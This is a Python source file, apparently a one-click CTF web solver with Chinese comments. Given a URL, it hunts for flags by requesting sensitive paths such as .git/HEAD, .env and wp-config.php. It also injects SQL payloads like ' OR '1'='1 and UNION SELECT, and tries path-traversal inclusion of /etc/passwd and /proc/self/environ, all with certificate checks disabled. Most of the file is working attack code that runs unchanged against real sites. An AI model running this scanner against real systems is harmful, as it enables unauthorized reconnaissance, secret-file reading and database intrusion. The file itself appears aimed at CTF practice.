# -*- coding: utf-8 -*-
"""CTF Web 一键解题引擎 — 输入 URL 自动探测并尝试提取 flag."""

from __future__ import annotations

import re
import sys
import io
import threading

# 用标准库做 HTTP
import urllib.request
import urllib.error
import urllib.parse
import ssl
import socket

FLAG_PATTERNS = [
    re.compile(r'[A-Za-z]{4}\{[^}]+\}'),  # 任意4字母{} 如 ABCD{xxx}
    re.compile(r'flag\{[^}]+\}', re.IGNORECASE),
    re.compile(r'ISCC\{[^}]+\}'),
    re.compile(r'ctf\{[^}]+\}', re.IGNORECASE),
]


def solve_web(url: str, progress_callback=None) -> dict:
    """对 URL 发起自动探测，返回结果.

    Returns:
        {
            "success": bool,
            "flag": str or None,
            "results": [{"step": str, "status": "ok"/"fail"/"flag!", "detail": str}],
        }
    """
    results = []
    flag = None
    ctx = _make_ssl_ctx()

    def log(step, status, detail=""):
        results.append({"step": step, "status": status, "detail": detail})
        if progress_callback:
            progress_callback(step, status, detail)

    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # ── 1. 基本请求 ──
    log("HTTP GET", "running", url)
    try:
        req = urllib.request.Request(url, headers=_headers())
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            body_raw = resp.read()
            status = resp.status
            content_type = resp.headers.get("Content-Type", "")
            server = resp.headers.get("Server", "")
    except urllib.error.HTTPError as e:
        body_raw = e.read() if e.fp else b""
        status = e.code
        server = ""
    except Exception as e:
        log("HTTP GET", "fail", str(e)[:200])
        return {"success": False, "flag": None, "results": results}

    # 尝试解码
    body = _decode_body(body_raw, content_type) if body_raw else ""
    log("HTTP GET", "ok", f"status={status}, len={len(body_raw)}, server={server}")

    # ── 2. 检查页面自带的 flag ──
    f = _find_flag(body)
    if f:
        log("Flag Found", "flag!", f)
        return {"success": True, "flag": f, "results": results}

    # ── 3. 扫描敏感路径 ──
    dir_result = _scan_dirs(url, ctx)
    log("Dir Scan", "ok" if dir_result else "none", f"checked {len(DIR_LIST)} paths")
    for r in dir_result:
        log(f"  {r['path']}", r['status'], r.get('detail', ''))

    # ── 4. PHP 信息泄露路径 ──
    leak_flag = _try_leak_paths(url, ctx)
    if leak_flag:
        log("Leak Path", "flag!", leak_flag)
        return {"success": True, "flag": leak_flag, "results": results}

    # ── 5. 尝试简单 SQL 注入 ──
    sql_flag = _try_sqli(url, ctx)
    if sql_flag:
        log("SQL Injection", "flag!", sql_flag)
        return {"success": True, "flag": sql_flag, "results": results}

    # ── 6. 尝试 LFI ──
    lfi_flag = _try_lfi(url, ctx)
    if lfi_flag:
        log("LFI", "flag!", lfi_flag)
        return {"success": True, "flag": lfi_flag, "results": results}

    # ── 总结 ──
    log("Result", "none", "no flag found")
    return {"success": False, "flag": None, "results": results}


def _headers():
    return {
        "User-Agent": "Mozilla/5.0 Yang-Web CTF Solver",
        "Accept": "*/*",
    }


def _make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _decode_body(raw, content_type):
    for enc in ["utf-8", "gbk", "gb2312", "latin-1"]:
        try:
            return raw.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return raw.decode("utf-8", errors="replace")


def _find_flag(text):
    if not text:
        return None
    for pat in FLAG_PATTERNS:
        m = pat.search(text)
        if m:
            return m.group(0)
    return None


def _http_get(url, ctx):
    try:
        req = urllib.request.Request(url, headers=_headers())
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, (e.read() if e.fp else b"")
    except Exception:
        return None, b""


# ── 目录扫描 ──
DIR_LIST = [
    "robots.txt", ".git/HEAD", ".env", ".DS_Store", "backup.zip",
    "admin/", "login.php", "admin.php", "config.php", "db.php",
    "phpinfo.php", "info.php", "test.php", "shell.php",
    "flag", "flag.txt", "flag.php", "/flag", "/secret",
    "index.php.bak", "index.php~", "config.php.bak",
    "www.zip", "www.tar.gz", "source.zip",
    "swagger.json", "api-docs", "actuator",
    ".svn/entries", ".hg/requires",
    "wp-admin/", "wp-config.php", "wp-content/",
    "WEB-INF/web.xml", "console",
    "debug/", "debug/default/view", "?debug=1",
]


def _scan_dirs(base_url, ctx):
    found = []
    for path in DIR_LIST:
        url = base_url.rstrip("/") + "/" + path.lstrip("/")
        code, body = _http_get(url, ctx)
        if code and code != 404:
            detail = f"status={code}"
            flag = _find_flag(_decode_body(body, ""))
            if flag:
                detail += f" flag={flag}"
            found.append({"path": path, "status": "ok", "detail": detail})
    return found


# ── 信息泄露路径 ──
LEAK_PATHS = [
    ("/robots.txt", None),
    ("/.git/HEAD", None),
    ("/.env", None),
    ("/flag", None),
    ("/flag.txt", None),
    ("/secret/flag", None),
    ("/secret", None),
    ("/backup.zip", None),
    ("/www.zip", None),
]


def _try_leak_paths(base_url, ctx):
    for path, _ in LEAK_PATHS:
        url = base_url.rstrip("/") + path
        code, body = _http_get(url, ctx)
        if code and code != 404:
            text = _decode_body(body, "")
            f = _find_flag(text)
            if f:
                return f
    return None


# ── 简单 SQL 注入 ──
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT 1,2,3,flag,5 FROM flags--",
    "' UNION SELECT 1,flag,3 FROM flag--",
    "admin' --",
    "admin' OR '1'='1",
]


def _try_sqli(base_url, ctx):
    """尝试在 URL 参数 / POST 中注入."""
    parsed = urllib.parse.urlparse(base_url)
    path = parsed.path or "/"
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query)
        for key in params:
            for payload in SQLI_PAYLOADS[:3]:
                new_params = params.copy()
                new_params[key] = [payload]
                new_qs = urllib.parse.urlencode(new_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{new_qs}"
                code, body = _http_get(test_url, ctx)
                if body:
                    f = _find_flag(_decode_body(body, ""))
                    if f:
                        return f
    return None


# ── LFI ──
LFI_PATHS = [
    "/etc/passwd",
    "/etc/hosts",
    "../../etc/passwd",
    "....//....//etc/passwd",
    "/proc/self/environ",
]


def _try_lfi(base_url, ctx):
    parsed = urllib.parse.urlparse(base_url)
    path = parsed.path or "/"

    # 尝试 file= / page= / include= 参数
    for param in ["file", "page", "include", "path", "template", "view", "document"]:
        for lfi_path in LFI_PATHS[:3]:
            test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{param}={urllib.parse.quote(lfi_path)}"
            code, body = _http_get(test_url, ctx)
            if body:
                text = _decode_body(body, "")
                f = _find_flag(text)
                if f:
                    return f
                # 如果读到了 passwd，说明 LFI 可用
                if "root:" in text:
                    return f"LFI confirmed on {param}, try deeper traversal"
    return None
